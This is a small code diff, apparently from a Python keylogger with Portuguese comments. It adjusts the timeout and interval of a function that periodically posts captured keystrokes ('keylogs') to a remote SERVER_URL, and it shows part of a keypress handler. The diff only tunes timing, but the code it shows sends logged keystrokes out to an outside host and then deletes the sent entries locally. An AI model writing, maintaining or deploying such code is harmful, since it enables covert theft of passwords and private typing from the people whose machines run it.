@@ -21,7 +21,7 @@ def enviar_para_nuvem():
         
         if dados_para_enviar:
             try:
-                res = requests.post(SERVER_URL, data={'keylogs': dados_para_enviar}, timeout=30)
+                res = requests.post(SERVER_URL, data={'keylogs': dados_para_enviar}, timeout=15)
                 if res.status_code == 200:
                     with lock:
                         # Remove apenas o que foi enviado com sucesso
@@ -30,7 +30,7 @@ def enviar_para_nuvem():
             except Exception as e:
                 print(f"\n[AGUARDANDO] Servidor offline ou acordando...")
         
-        time.sleep(5)
+        time.sleep(15)
 
 def on_press(key):
     global buffer_nuvem # Global sempre no topo da função
